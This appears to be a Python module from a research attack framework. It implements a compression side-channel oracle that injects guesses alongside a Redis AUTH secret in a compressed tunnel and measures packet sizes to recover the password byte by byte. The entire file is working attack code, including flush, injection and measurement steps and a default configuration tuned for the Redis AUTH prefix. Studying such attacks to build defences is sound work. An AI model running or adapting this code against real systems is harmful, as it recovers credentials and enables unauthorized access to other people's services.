"""Direct-injection adapter (Section 5.1).

Ordering per oracle query:
  1. Flush -- throwaway connection, `flush_bytes` random bytes.
  2. Open the measure tunnel before the secret so CHANNEL_OPEN enters the
     compressor before the secret transmission.
  3. Settle so CHANNEL_OPEN reaches the sniffer.
  4. Trigger Redis AUTH -- secret enters compressor right before the guess.
  5. Settle.
  6. Clear packet log.
  7. Write guess on the measure tunnel.
  8. Settle.
  9. Read packet log.
"""

from __future__ import annotations

import asyncio
import os
import random
import secrets
from typing import TYPE_CHECKING, Any

from attacker.attack.config import AttackConfig, AlignmentMode

if TYPE_CHECKING:
    import aiohttp

CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))


class DirectAdapter:
    def __init__(self, packet_log: Any) -> None:
        self._packet_log = packet_log
        self._config: AttackConfig | None = None
        self._session: "aiohttp.ClientSession | None" = None

    async def setup(self, config: AttackConfig, http_session: "aiohttp.ClientSession") -> None:
        self._config = config
        self._session = http_session

    async def teardown(self) -> None:
        self._config = None
        self._session = None

    async def measure_once(
        self, prefix: bytes, candidate: bytes, alignment: bytes,
    ) -> int:
        cfg = self._config
        assert cfg is not None and self._session is not None

        if cfg.flush_bytes > 0:
            flush_data = _flush_payload(cfg)
            try:
                _, fw = await _open_tunnel()
                fw.write(flush_data)
                await fw.drain()
            except (ConnectionResetError, BrokenPipeError, OSError):
                pass
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        _, mw = await _open_tunnel()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        async with self._session.post(f"{CLIENT_BASE}/send_secret") as r:
            await r.read()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)

        self._packet_log.clear()
        mw.write(prefix + candidate + alignment)
        await mw.drain()
        if cfg.settle > 0:
            await asyncio.sleep(cfg.settle)
        measured = _sum_c2s(
            self._packet_log.snapshot(), cfg.measurement_min_segment_size,
        )

        try:
            mw.close()
        except Exception:  # noqa: BLE001
            pass

        return measured

    @classmethod
    def default_config(cls) -> AttackConfig:
        return AttackConfig(
            known_prefix=b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
            alphabet=[bytes([c]) for c in b"abcdefghijklmnopqrstuvwxyz0123456789"],
            max_length=32,
            terminator=b"\r",
            min_margin=16,
            max_rounds=128,
            settle=0.01,
            alignment_mode=AlignmentMode.FULL_SWEEP,
            alignment_lengths=[0, 1, 2, 3, 4, 5, 6, 7],
            candidate_elimination=True,
            constant_prefix_trim=True,
            adaptive_alignment=True,
            stall_detection=True,
            alignment_hint_carryover=True,
            outlier_threshold=0,
            flush_bytes=32768,
            flush_pool="secrets_random",
            measurement_min_segment_size=0,
            candidate_fork_on_stall=False,
            fork_top_k=5,
            max_fork_depth=2,
            label="direct-default",
        )


async def _open_tunnel(retries: int = 20, delay: float = 1.0) -> tuple:
    for attempt in range(1, retries + 1):
        try:
            return await asyncio.open_connection(CLIENT_HOST, TUNNEL_PORT)
        except (OSError, ConnectionRefusedError):
            if attempt >= retries:
                raise
            await asyncio.sleep(delay)
    raise RuntimeError("unreachable")


def _flush_payload(cfg: AttackConfig) -> bytes:
    if cfg.flush_pool == "secrets_random":
        return secrets.token_bytes(cfg.flush_bytes)
    if cfg.flush_pool == "high_ascii":
        return bytes(random.choices(range(0x80, 0x100), k=cfg.flush_bytes))
    raise ValueError(f"unexpected flush_pool {cfg.flush_pool!r}")


def _sum_c2s(records: list[dict], min_segment_size: int) -> int:
    return sum(
        r["tcp_payload_len"] for r in records
        if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > min_segment_size
    )
